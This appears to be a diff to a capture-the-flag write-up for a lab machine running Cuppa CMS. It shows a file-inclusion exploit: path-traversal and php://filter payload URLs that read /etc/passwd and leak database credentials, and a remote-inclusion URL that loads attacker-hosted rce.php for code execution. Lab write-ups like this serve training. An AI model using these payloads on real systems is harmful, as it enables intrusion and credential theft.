@@ -104,6 +104,32 @@ Damn, Miles really cares about his wife. Anyway, let's access `http://target_IP/
 ![image](https://github.com/user-attachments/assets/7e7a4d45-f47c-446f-aa17-f660336d81ee)<br />
 Oh yes he is infact an AI specialist. The page itself seems empty, the source code doesn't contain any comments. Let's try some directory enumeration with `obuster dir -u http://10.10.190.140/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`. Yup, there's something there <br />
 ![image](https://github.com/user-attachments/assets/8cf719c1-1d90-4971-a17e-7f9ed064ede8)<br />
+At this point I was stuck for a while, I didn't find anything, default credentials, sql Injection, etc. After a while I discovered that this version is vulnerable to File inclusion, even anauthenticated, [here](https://www.exploit-db.com/exploits/25971). <br />
+![image](https://github.com/user-attachments/assets/52294868-bdee-44a7-86b2-ba222c2ea82d)<br />
+So for example if we try to access `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, it actually works and shows us the /etc/passwd file. <br />
+![image](https://github.com/user-attachments/assets/3dd36bb6-f73b-45fa-8feb-e089289ce502)<br />
+Let's try downloading the configuration file: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`. We get the following base64 encoded string in return. Decode it: 
+
+      <?php 
+      	class Configuration{
+      		public $host = "localhost";
+      		public $db = "cuppa";
+      		public $user = "root";
+      		public $password = "password123";
+      		public $table_prefix = "cu_";
+      		public $administrator_template = "default";
+      		public $list_limit = 25;
+      		public $token = "OBqIPqlFWf3X";
+      		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
+      		public $upload_default_path = "media/uploadsFiles";
+      		public $maximum_file_size = "5242880";
+      		public $secure_login = 0;
+      		public $secure_login_value = "";
+      		public $secure_login_redirect = "";
+      	} 
+And we got another set of credentials. These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it rce.php (the code is provided in the file "rce.php" of this folder). Set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/rce.php`. There we go: <br />
+![image](https://github.com/user-attachments/assets/f97120a9-1b82-4629-a34e-9a4818959216)<br />
+The file was successfully uploaded.
 
                                                             
 - What is Miles password for his emails?
